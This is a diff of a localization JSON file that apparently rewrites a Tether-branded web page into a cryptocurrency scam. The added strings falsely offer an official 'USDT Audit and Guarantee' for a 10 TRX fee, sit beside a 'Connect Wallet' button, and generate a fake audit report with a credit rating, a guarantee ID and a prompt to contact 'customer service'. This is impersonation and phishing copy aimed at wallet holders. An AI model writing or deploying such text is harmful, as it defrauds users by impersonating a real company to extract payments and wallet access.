@@ -1,11 +1,9 @@
 {
   "greeting": "hello",
-  "blockOne.title": "Tether Token",
-  "blockOne.subtitle.1": "The World's First Stablecoin",
-  "blockOne.subtitle.2": "Unparalleled Liquidit",
-  "blockOne.subtitle.3": "Widespread Adoption",
-  "blockOne.subtitle.4": "Exponential Growth",
-  "blockOne.subtitle.5": "Driving the Future of Money",
+  "blockOne.title": "Tether USDT Audit and Guarantee",
+  "blockOne.subtitle.1": "Only pay 10 TRX to review and report your USDT assets",
+  "blockOne.subtitle.2": "Height-quality users can use ab exclusive reserve USD account provided by Tether for free as guarantee",
+  "blockOne.subtitle.3": "Increase your credibility in OTC trading",
   "blockOne.input.emailAddress": "Email Address",
   "blockOne.button.connectWallet": "Connect Wallet",
   "blockTwo.title": "Driving the Future of Money",
@@ -28,5 +26,9 @@
   "blockSix.faq.3.title": "What are Tether Tokens?",
   "blockSix.faq.3.content": "Tether tokens are assets that move across the blockchain just as easily as other digital currencies but that are pegged to real-world currencies on a 1-to-1 basis.<br><br>Tether tokens are referred to as stablecoins because they offer price stability as they are pegged to a fiat currency. This offers traders, merchants and funds a low volatility solution when exiting positions in the market.<br><br>All Tether tokens are pegged at 1-to-1 with a matching fiat currency (e.g., 1 USD₮ = 1 USD) and are backed 100% by Tether's reserves.<br><br>As a fully transparent company, we publish a daily record of the current total assets and reserves.",
   "blockSix.faq.4.title": "What currencies commodities does Tether support?",
-  "blockSix.faq.4.content": "Tether supports US dollars (USD), euros, Mexican peso, offshore Chinese yuan, and Gold, with the following Tether tokens, respectively: USD₮, EUR₮, MXN₮, CNH₮ and XAU₮."
+  "blockSix.faq.4.content": "Tether supports US dollars (USD), euros, Mexican peso, offshore Chinese yuan, and Gold, with the following Tether tokens, respectively: USD₮, EUR₮, MXN₮, CNH₮ and XAU₮.",
+  "report.title": "USDT-TRC20 Account Audit Report",
+  "report.walletAddress": "Tron wallet address TMJfx...",
+  "report.creditRating": "Credit Rating: A",
+  "report.content": "The USDT you hold has been reviewed by Tether, and there is a abnormality after checking the historical transactions. The credit raring is A. Tether can provide a dedicated reserve USD account as a guarantee for free. Your guarantee ID: TEKvt08rk. if you need this service Please contact customer service."
 }
